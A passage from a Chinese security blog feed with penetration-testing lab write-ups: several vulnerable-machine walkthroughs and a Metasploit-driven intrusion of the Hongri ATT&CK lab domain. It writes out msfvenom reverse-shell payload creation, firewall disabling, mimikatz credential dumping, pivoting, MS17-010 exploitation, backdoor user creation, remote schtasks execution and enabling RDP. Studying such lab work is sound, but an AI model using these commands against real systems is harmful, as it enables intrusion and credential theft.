src="/../images/image-20230304211248271-1686283466995.png" alt="image-20230304211248271"></p><p>发现了一个目录，目录名为hubert是收集到的一个用户，并且uid和gid为1001，证明其是第一个用户，所以该目录为hubert用户的家目录。</p><p>另一个文件使用get命令下载到本地后</p><p><img src="/../images/image-20230304212449213-1686283466995.png" alt="image-20230304212449213"></p><p>可以发现是一个同步完成的日志。</p><blockquote><p>所以根据这两个信息，我们可以知道服务器会同步这个ftp上的文件，就相当于我们可以操作hubert用户的家目录。</p></blockquote><p>我们使用put命令上传自己的公钥</p><p><img src="/../images/image-20230304212132365-1686283466995.png" alt="image-20230304212132365"></p><p>需要注意公钥名</p><p><img src="/../images/image-20230304212209119-1686283466995.png" alt="image-20230304212209119"></p><p>然后ssh连接</p><p><img src="/../images/image-20230304212235168-1686283466995.png" alt="image-20230304212235168"></p><p>看下家目录有啥</p><p><img src="/../images/image-20230304212842826-1686283466995.png" alt="image-20230304212842826"></p><p>读取这个root权限的py文件，我们可以知道这个网站被黑客frica攻击了，并且留下了后门，所以这也是为什么前面叫人来修复网站的原因🤣</p><p>这个黑客还告诉我们他留下了松散的权限😍</p><p><img src="/../images/image-20230304212825018-1686283466995.png" alt="image-20230304212825018"></p><p>让我康康</p><p><img src="/../images/image-20230304213424178-1686283466995.png" alt="image-20230304213424178"></p><p>这次有strings命令，查看getinfo</p><p><img src="/../images/image-20230304213618067-1686283466995.png" alt="image-20230304213618067"></p><p>跟上一个靶机一样</p><p><img src="/../images/image-20230304213721571-1686283466995.png" alt="image-20230304213721571"></p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="/../images/image-20230305160546454-1686283466995.png" alt="image-20230305160546454"></p><p><img src="/../images/image-20230305163954224-1686283466995.png" alt="image-20230305163954224"></p><p>wpscan用户枚举</p><p><img src="/../images/image-20230305160724611-1686283466995.png" alt="image-20230305160724611"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abuzerkomurcu</span><br><span class="line">collins</span><br><span class="line">gill</span><br><span class="line">collins</span><br><span class="line">satanic</span><br></pre></td></tr></table></figure><p>密码字典生成</p><p><img src="/../images/image-20230305162409527-1686283466995.png" alt="image-20230305162409527"></p><blockquote><p>-m 6 是因为wordpress密码最少6个字符</p></blockquote><p>爆破密码</p><p><img src="/../images/image-20230305162556601-1686283466995.png" alt="image-20230305162556601"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gill / interchangeable</span><br></pre></td></tr></table></figure><p>普通用户，后台只找到一张可以图片DB</p><p><img src="/../images/image-20230305164352862-1686283466996.png" alt="image-20230305164352862"></p><p>分析这张图片</p><p><img src="/../images/image-20230305164731337-1686283466996.png" alt="image-20230305164731337"></p><p><img src="/../images/image-20230305164827742-1686283466996.png" alt="image-20230305164827742"></p><p>得到ssh账号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gill 59583hello</span><br></pre></td></tr></table></figure><p>登陆后发现</p><p><img src="/../images/image-20230305165100247-1686283466996.png" alt="image-20230305165100247"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lost+found目录无权限</span><br><span class="line"></span><br><span class="line">家目录下有一个kEYFILE</span><br></pre></td></tr></table></figure><p>通过搜索得到</p><p><img src="/../images/image-20230305165731867-1686283466996.png" alt="image-20230305165731867"></p><p><img src="/../images/image-20230305171048832-1686283466996.png" alt="image-20230305171048832"></p><p>可以使用john进行破解，机子GPU太垃圾了，直接从wp拿到密码</p><p>获得密码后，可以用KeePass软件<a href="https://sourceforge.net/projects/keepass/%E6%89%93%E5%BC%80%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99">https://sourceforge.net/projects/keepass/打开，也可以用在线网站</a></p><p><a href="https://app.keeweb.info/%E6%89%93%E5%BC%80%E3%80%82">https://app.keeweb.info/打开。</a></p><p>打开后发现6个空白的key</p><p><img src="/../images/image-20230305172848464-1686283466996.png" alt="image-20230305172848464"></p><p>不知道拿来干嘛的。。</p><p>继续信息收集，发现根目录下有一个keyfolder，可能就是要让上面的key放在这个keyfolder</p><p>而且使用pyps64监控进程发现有一个定时任务key.sh，每一分钟执行一次。</p><p><img src="/../images/image-20230305172941445-1686283466996.png" alt="image-20230305172941445"></p><p>经测试当只有一个文件fracturedocean时</p><p><img src="/../images/image-20230305174849955-1686283466996.png" alt="image-20230305174849955"></p><p><img src="/../images/image-20230305175028644-1686283466996.png" alt="image-20230305175028644"></p><p>定时脚本内容</p><p><img src="/../images/image-20230305175728426-1686283466996.png" alt="image-20230305175728426"></p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p><img src="/../images/image-20230307141431844-1686283466996.png" alt="image-20230307141431844"></p><p>只开放了80端口</p><p><img src="/../images/image-20230307141917191-1686283466996.png" alt="image-20230307141917191"></p><p>提示我们目录扫描要添加zip类型，说明网站目录应该存在zip文件</p><p>目录扫描</p><p>dirserach</p><p><img src="/../images/image-20230307142511029-1686283466996.png" alt="image-20230307142511029"></p><p>gobuster</p><p><img src="/../images/image-20230307142447064-1686283466996.png" alt="image-20230307142447064"></p><p>访问&#x2F;spammer下载得到spammer.zip</p><p>使用john爆破</p><p><img src="/../images/image-20230307142628410-1686283466997.png" alt="image-20230307142628410"></p><p>解压得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mayer:lionheart</span><br></pre></td></tr></table></figure><p>访问网站</p><p><img src="/../images/image-20230307141958670-1686283466997.png" alt="image-20230307141958670"></p><p>尝试登录解压得到的用户，成功登录</p><p><img src="/../images/image-20230307142917723-1686283466997.png" alt="image-20230307142917723"></p><p>逛了一圈发现，页面编辑，邮箱泄露，插件（无法加载作罢）。</p><ul><li><p>网站配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Textpattern version: 4.8.3 (596bca03a4b32004412499363cecec62)</span><br><span class="line">Last update: 2020-09-13 19:56:06</span><br><span class="line">Site URL: 192.168.2.35/textpattern</span><br><span class="line">Admin URL: 192.168.2.35/textpattern/textpattern</span><br><span class="line">Document root: /var/www</span><br><span class="line">$path_to_site: /var/www/textpattern</span><br><span class="line">Textpattern path: /var/www/textpattern/textpattern</span><br><span class="line">Article URL pattern: messy</span><br><span class="line">Production status: testing</span><br><span class="line">Temporary directory path: /tmp</span><br><span class="line">PHP version: 5.5.38-1~dotdeb+7.1</span><br><span class="line">GD Graphics Library: Unavailable</span><br><span class="line">Server timezone: UTC</span><br><span class="line">Server local time: 2023-03-07 14:40:29</span><br><span class="line">Daylight Saving Time enabled?: 0</span><br><span class="line">Automatically adjust Daylight Saving Time setting?: 1</span><br><span class="line">Time zone (GMT offset in seconds): Asia/Baghdad (10800)</span><br><span class="line">MySQL: 5.5.47-0+deb7u1 ((Debian)) </span><br><span class="line">Database server time: 2023-03-07 08:40:29</span><br><span class="line">Database server time offset: 0 s</span><br><span class="line">Database server timezone: SYSTEM</span><br><span class="line">Database session timezone: SYSTEM</span><br><span class="line">Locale: C</span><br><span class="line">Site / Admin language: en / en</span><br><span class="line">Web server: Apache/2.2.22 (Debian)</span><br><span class="line">Apache version: Apache/2.2.22 (Debian)</span><br><span class="line">PHP server API: apache2handler</span><br><span class="line">RFC 2616 headers: </span><br><span class="line">Server OS: Linux 3.2.0-4-amd64</span><br><span class="line">Admin-side theme: hive 4.8.3</span><br><span class="line"></span><br><span class="line">Pre-flight check: </span><br><span class="line">------------------------</span><br><span class="line"></span><br><span class="line">New Textpattern version 4.8.8 available for download. Help</span><br><span class="line"></span><br><span class="line">DNS lookup failed: 192.168.2.35 Help</span><br><span class="line"></span><br><span class="line">/var/www/textpattern/textpattern/setup/ still exists. Help</span><br><span class="line"></span><br><span class="line">Site URL preference might be incorrect: 192.168.174.159/textpattern Help</span><br><span class="line"></span><br><span class="line">Image directory is not writable: /var/www/textpattern/images</span><br><span class="line">Theme directory is not writable: /var/www/textpattern/themes</span><br><span class="line">Plugin directory is not writable: /var/www/textpattern/textpattern/plugins Help</span><br><span class="line">------------------------</span><br><span class="line"></span><br><span class="line">.htaccess file contents: </span><br><span class="line">------------------------</span><br><span class="line"># BEGIN Textpattern</span><br><span class="line"></span><br><span class="line">#DirectoryIndex index.php index.html</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">    RewriteEngine On</span><br><span class="line"></span><br><span class="line">    # Enable the `FollowSymLinks` option below if it isn&#x27;t already.</span><br><span class="line">    #Options +FollowSymlinks</span><br><span class="line"></span><br><span class="line">    #RewriteBase /relative/web/path/</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; -f [OR]</span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; -d</span><br><span class="line">    RewriteRule ^(.+) - [PT,L]</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_URI&#125; !=/favicon.ico</span><br><span class="line">    RewriteRule ^(.*) index.php</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;HTTP:Authorization&#125;  !^$</span><br><span class="line">    RewriteRule .* - [E=REMOTE_USER:%&#123;HTTP:Authorization&#125;]</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_mime.c&gt;</span><br><span class="line">    AddType image/svg+xml  svg svgz</span><br><span class="line">    AddEncoding gzip       svgz</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line"># For additional Apache-compatible web server configuration settings to enhance</span><br><span class="line"># site performance and security, we recommend:</span><br><span class="line"># https://github.com/h5bp/server-configs-apache/blob/master/dist/.htaccess</span><br><span class="line"></span><br><span class="line"># END Textpattern</span><br><span class="line"></span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure></li><li><p>文件上传</p><p>可以直接上传🐎，无任何防护</p><p>漏洞分析：<a href="https://blog.csdn.net/yun2diao/article/details/92765372">https://blog.csdn.net/yun2diao/article/details/92765372</a></p><p>反弹shell</p><img src="../../../typora img/image-20230307151417930.png" alt="image-20230307151417930" style="zoom:80%;" /></li></ul><p>提权</p><p>上传linepeas.sh查找可提权项</p><p>这里查找CVE</p><p><img src="/../images/image-20230307153044644-1686283466997.png" alt="image-20230307153044644"></p><p>选择一个cve进行提权，我这里选择的是脏牛提权<a href="https://github.com/firefart/dirtycow">https://github.com/firefart/dirtycow</a></p><p><img src="/../images/image-20230307154757476-1686283466997.png" alt="image-20230307154757476"></p><p><img src="/../images/image-20230307154831929-1686283466997.png" alt="image-20230307154831929"></p><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p><img src="/../images/image-20230307182708576-1686283466997.png" alt="image-20230307182708576"></p><p><img src="/../images/image-20230307182726635-1686283466997.png" alt="image-20230307182726635"></p><p>开放了很多端口和服务，不同端口上都有网站，所以目录扫描时需要注意扫哪个端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">66</span><br><span class="line">80</span><br><span class="line">8086</span><br></pre></td></tr></table></figure><ul><li><p>80端口</p><p><img src="/../images/image-20230307224547682-1686283466997.png" alt="image-20230307224547682"></p><p>msf一条龙</p></li></ul><p><img src="/../images/image-20230307224427084-1686283466997.png" alt="image-20230307224427084"></p><p><img src="/../images/image-20230307224412649-1686283466997.png" alt="image-20230307224412649"></p><ul><li><p>66端口</p><p>dirsearch扫描结果</p><p><img src="/../images/image-20230307224912102-1686283466997.png" alt="image-20230307224912102"></p><p><img src="/../images/image-20230307224854194-1686283466998.png" alt="image-20230307224854194"></p><p>​历史命令操作.bash_history重要部分</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget 192.168.2.43:81/root.txt</span><br><span class="line">mv root.txt flag.txt</span><br><span class="line">nano flag.txt</span><br></pre></td></tr></table></figure><p>可以发现从别的主机上复制了flag，并重名为flag.txt</p></li><li><p>8086</p><p><img src="/../images/image-20230307225845372-1686283466998.png" alt="image-20230307225845372"></p><p>都是静态页面</p></li></ul><p>这里看了wp正常是从66端口目录扫描出&#x2F;eno目录，下载并破解zip压缩包，获得80端口的用户凭证的。。</p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>不知道为什么没有8</p><p><img src="/../images/image-20230307232027664-1686283466998.png" alt="image-20230307232027664"></p><p>网站</p><p>只有一个登录框</p><p>sql注入失败，弱口令爆破失败</p><p>目录扫描</p><p><img src="/../images/image-20230307234601067-1686283466998.png" alt="image-20230307234601067"></p><p>看到backup还以为有备份文件可以进行代码审计，但是没有；</p><p>访问&#x2F;admin&#x2F;home.php尝试是否存在未授权，发现没有。</p><p>寻找网站框架漏洞 </p><p><img src="/../images/image-20230307234835760-1686283466999.png" alt="image-20230307234835760"></p><p>尝试了之后发现只存在rce漏洞</p><p><img src="/../images/image-20230307233410737-1686283466999.png" alt="image-20230307233410737"></p><p><img src="/../images/image-20230307233603248-1686283466999.png" alt="image-20230307233603248"></p><p><img src="/../images/image-20230307233643324-1686283466999.png" alt="image-20230307233643324"></p><p>使用第二个py脚本</p><p><img src="/../images/image-20230308001806203-1686283466999.png" alt="image-20230308001806203"></p><p><img src="/../images/image-20230308001820794-1686283466999.png" alt="image-20230308001820794"></p><p>这个脚本很贴心地给出了服务器信息，并读取了配置文件，获得了clapton用户的凭证。</p><p><img src="/../images/image-20230307234930848-1686283467000.png" alt="image-20230307234930848"></p><p>发现大部分命令明明可以使用的却都执行不了，所以需要反弹shell到kali，经测试可以使用nc进行反弹shell</p><p><img src="/../images/image-20230308130950848-1686283467000.png" alt="image-20230308130950848"></p><p>使用python切换为交互式shell，切换到clapton用户</p><p><img src="/../images/image-20230308131017546-1686283467000.png" alt="image-20230308131017546"></p><p>发现clapton家目录下有note.txt</p><p><img src="/../images/image-20230308131125354-1686283467000.png" alt="image-20230308131125354"></p><p>读取</p><p><img src="/../images/image-20230308131243068-1686283467000.png" alt="image-20230308131243068"></p><p>提示我们用缓冲区溢出漏洞提权，这部分pwn不会</p><p>按照下面文章中的方法进行复现</p><p><a href="https://zhuanlan.zhihu.com/p/570218595">https://zhuanlan.zhihu.com/p/570218595</a></p><p>最后贴上复现成功的截图</p><p><img src="/../images/image-20230308130938122-1686283467000.png" alt="image-20230308130938122"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红日ATTC&amp;CK靶场1</title>
      <link href="/2023/06/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/"/>
      <url>/2023/06/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>通过MSF对红日靶场1进行内网渗透</p><p>获得服务器权限就不写了</p></blockquote><h2 id="获得外网主机权限"><a href="#获得外网主机权限" class="headerlink" title="获得外网主机权限"></a>获得外网主机权限</h2><h3 id="木马生成"><a href="#木马生成" class="headerlink" title="木马生成"></a>木马生成</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.41.128  -f exe &gt; reverse.exe</span><br></pre></td></tr></table></figure><p><strong>reverse_tcp与bind_tcp的区别</strong></p><p><img src="/../images/1605154-20200928100839725-1360637319-1686283281460.png" alt="img"></p><h3 id="防火墙关闭"><a href="#防火墙关闭" class="headerlink" title="防火墙关闭"></a>防火墙关闭</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><ul><li><p>查看状态</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall show allprofile state</span><br></pre></td></tr></table></figure></li><li><p>更改状态</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofile state on/off</span><br></pre></td></tr></table></figure><p>不关的话，执行木马就会弹出这个</p><p><img src="/../images/image-20230324195048832-1686283281461.png" alt="image-20230324195048832"></p></li></ul><h3 id="获得主机session"><a href="#获得主机session" class="headerlink" title="获得主机session"></a>获得主机session</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp # 要设置木马的生成payload，不然连不上</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324151026344-1686283281461.png" alt="image-20230324151026344"></p><h2 id="信息收集等"><a href="#信息收集等" class="headerlink" title="信息收集等"></a>信息收集等</h2><h4 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h4><ol><li><p>隐蔽自身</p><p>选择注入到explorer.exe进程中</p><blockquote><p>explorer.exe是<a href="https://baike.baidu.com/item/Windows/165458?fromModule=lemma_inlink">Windows</a>程序管理器或者<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8/58635296?fromModule=lemma_inlink">文件资源管理器</a>，它用于管理Windows图形壳，包括桌面和<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/1452357?fromModule=lemma_inlink">文件管理</a>，删除该程序会导致Windows<a href="https://baike.baidu.com/item/%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2/8146283?fromModule=lemma_inlink">图形界面</a>无法使用。</p></blockquote><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ps | grep &quot;explore&quot;</span><br><span class="line">migrate pid</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324152046245-1686283281461.png" alt="image-20230324152046245"></p></li><li><p>切换进程位数</p><blockquote><p>不同的程序需要的位数不同</p><p>如：hashdump，kiwi只能在64位进程上执行</p></blockquote></li></ol><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><blockquote><p>先获取到administrator权限</p><p>再使用getsystem命令获取system权限</p></blockquote><p><img src="/../images/image-20230324152320920-1686283281461.png" alt="image-20230324152320920"></p><h4 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">主机信息</span></span><br><span class="line">ps</span><br><span class="line">sysinfo</span><br><span class="line">run post/windows/gather/enum_applications # 安装的应用</span><br><span class="line">run post/windows/gather/enum_patches # 安装的补丁</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网络</span></span><br><span class="line">route</span><br><span class="line">arp</span><br><span class="line">netstat –ano</span><br><span class="line"></span><br><span class="line">shell </span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure><h4 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324155246737-1686283281461.png" alt="image-20230324155246737"></p><p>主机shell下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">chcp 65001 #解决乱码</span><br><span class="line">ipconfig /all # DNS后缀判断域是否存在</span><br><span class="line">net time /domain # 判断域控</span><br><span class="line">nslookup time_domain # 获取域控ip</span><br></pre></td></tr></table></figure><h4 id="密码获取"><a href="#密码获取" class="headerlink" title="密码获取"></a>密码获取</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230330143036863-1686283281461.png" alt="image-20230330143036863"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="调用mimikatz"><a href="#调用mimikatz" class="headerlink" title="调用mimikatz"></a>调用mimikatz</h5><blockquote><p>在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。</p></blockquote><p><a href="https://tttang.com/archive/1616/">mimikatz命令</a></p><p><a href="https://www.cnblogs.com/-mo-/p/11890232.html">后渗透]Mimikatz使用大全 - 肖洋肖恩、 - 博客园</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kiwi_cmd module::xxx</span><br><span class="line">kiwi_cmd sekurlsa::wdigest</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswod</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324153358300-1686283281461.png" alt="image-20230324153358300"></p><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">portfwd add -l 1234 -p 4444 -r 192.168.41.129</span><br></pre></td></tr></table></figure><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="Venom代理"><a href="#Venom代理" class="headerlink" title="Venom代理"></a>Venom代理</h3><p><a href="https://blog.csdn.net/u011215939/article/details/103403545">内网穿透工具—Venom使用教程</a></p><p><img src="/../images/image-20230331194420393-1686283281461.png" alt="image-20230331194420393"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socks port</span><br><span class="line">然后配合proxychains使用</span><br></pre></td></tr></table></figure><h3 id="sockets代理"><a href="#sockets代理" class="headerlink" title="sockets代理"></a>sockets代理</h3><h4 id="MSF配置"><a href="#MSF配置" class="headerlink" title="MSF配置"></a>MSF配置</h4><ul><li>为当前sesison添加路由</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324170547279-1686283281461.png" alt="image-20230324170547279"></p><ul><li><p>使用socks5模块</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set SRVHOST 127.0.0.1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324170759790-1686283281461.png" alt="image-20230324170759790"></p><p>这里需要按一下回车</p><ul><li>查看jobs <img src="/../images/image-20230324170854437-1686283281462.png" alt="image-20230324170854437"></li></ul></li></ul><h4 id="kali配置"><a href="#kali配置" class="headerlink" title="kali配置"></a>kali配置</h4><blockquote><p>让kali中的其他工具也可访问内网主机</p></blockquote><ul><li><p>安装proxychains</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install proxychains</span><br></pre></td></tr></table></figure></li><li><p>编辑配置文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p>按照info给出的信息，添加socket代理</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">VERSION SRVHOST SRVPORT USERNAME PASSWORD</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324171113565-1686283281462.png" alt="image-20230324171113565"></p></li></ul><p><img src="/../images/image-20230324170936060-1686283281462.png" alt="image-20230324170936060"></p><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner rhosts=192.168.52.0/24</span><br></pre></td></tr></table></figure><h3 id="端口和漏洞扫描"><a href="#端口和漏洞扫描" class="headerlink" title="端口和漏洞扫描"></a>端口和漏洞扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">上传fscan进行扫描</span><br><span class="line"></span><br><span class="line">proxychains nmap -Pn -sT -p22,80,445,21,3306,6379 -sC  192.168.52.141</span><br></pre></td></tr></table></figure><p>注意：socks5代理-Pn -sT，不支持icmp协议</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>根据fscan的扫描结果可以知道域中三台主机均存在ms17_010漏洞</p><p>利用</p><p><img src="/../images/image-20230324192937093-1686283281462.png" alt="image-20230324192937093"></p><p>经过测试，发现只能用<code>admin/smb/ms17_010_command</code></p><p>在Windows2003主机上</p><p><img src="/../images/image-20230330141915854-1686283281462.png" alt="image-20230330141915854"></p><p>添加成功</p><p><img src="/../images/image-20230330142326253-1686283281462.png" alt="image-20230330142326253"></p><p>同理域控server2008也可以使用该payload</p><h4 id="ipc-连接"><a href="#ipc-连接" class="headerlink" title="ipc$连接"></a>ipc$连接</h4><blockquote><p><code>IPC$(Internet Process Connection)</code>是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，也就是两个进程之间可以利用它产生数据交互，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p></blockquote><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\ip /u:username password # 建立ipc$连接</span><br><span class="line"><span class="built_in">net</span> view \\ip # 查看目标机器的共享资源</span><br><span class="line"><span class="built_in">net</span> use z: \\IP\c$ # 将目标c盘映射为本地z盘</span><br><span class="line"><span class="built_in">dir</span> \\ip\盘符$\dir_path  # 列出指定目录文件</span><br><span class="line"><span class="built_in">copy</span> \\ip\盘符$\file save_path # 下载文件 save_path为绝对路径/保存到当前目录</span><br><span class="line"><span class="built_in">copy</span> file \\ip\盘符$\file # 复制文件</span><br><span class="line"><span class="built_in">net</span> use \\ip /<span class="built_in">del</span> /y # 删除ipc$连接</span><br></pre></td></tr></table></figure><ul><li><p>版本＜Windows2012</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip # 查看目标机器时间</span><br><span class="line"><span class="built_in">at</span> \\ip <span class="built_in">time</span>(<span class="number">11</span>:<span class="number">12</span>) c:\<span class="number">1</span>.bat # 创建定时任务</span><br></pre></td></tr></table></figure></li><li><p>版本＞Windows2012</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip # 查看目标机器时间</span><br><span class="line"></span><br><span class="line">schtasks /create /tn &quot;task&quot; /tr c:\windows\temp\plugin_update.exe /sc once /st <span class="number">16</span>:<span class="number">32</span> /S ip /RU System /u username /p &quot;passwd&quot;</span><br><span class="line"># 创建该时间之后的某个时刻自动执行任务，任务名 plugin_update</span><br><span class="line"></span><br><span class="line">schtasks /run /tn &quot;task&quot; /S ip /u username /p &quot;passwd&quot;</span><br><span class="line"># 立即运行后门程序</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">schtasks /F /delete /tn &quot;task&quot; /S ip /u username /p &quot;passwd&quot;</span><br><span class="line"># 删除创建的任务</span><br></pre></td></tr></table></figure></li></ul><p>这里添加了用户，用外网机使用ipc$与域控建立连接后，发现没有权限</p><p><img src="/../images/image-20230331151440023-1686283281462.png" alt="image-20230331151440023"></p><p>这是因为权限问题</p><p><a href="https://ares-x.com/2020/03/10/%E5%85%B3%E4%BA%8EIPC%E5%92%8CPTH%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/">关于IPC和PTH用户权限问题 | AresX’s Blog</a></p><blockquote><p>可以建立ipc$连接：</p><ul><li><p>域用户，并且该域用户在远程计算机的管理员组中。</p></li><li><p>本地管理员用户</p></li></ul><p>（如果本地管理员组启用了Administrator，那么本地管理员里只有Administrator是可以连接的）</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user khaz123 khaz777... /add</span><br><span class="line">net localgroup administrators username /add</span><br></pre></td></tr></table></figure><p>将khaz123用户添加到域控的本地管理员组中（因为是域控服务器添加用户，该用户自动为域用户），ipc$连接成功</p><p><img src="/../images/image-20230330235734609-1686283281462.png" alt="image-20230330235734609"></p><h4 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h4><p>同一时刻只能有一个用户登录</p><p><img src="/../images/image-20230331194248211-1686283281462.png" alt="image-20230331194248211"></p><h5 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></table></figure><h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><blockquote><p>实际上post&#x2F;windows&#x2F;manage&#x2F;enable_rdp就是利用了上面windows修改注册表的方式开启3389端口</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br><span class="line">rdesktop ip </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324160952786-1686283281462.png" 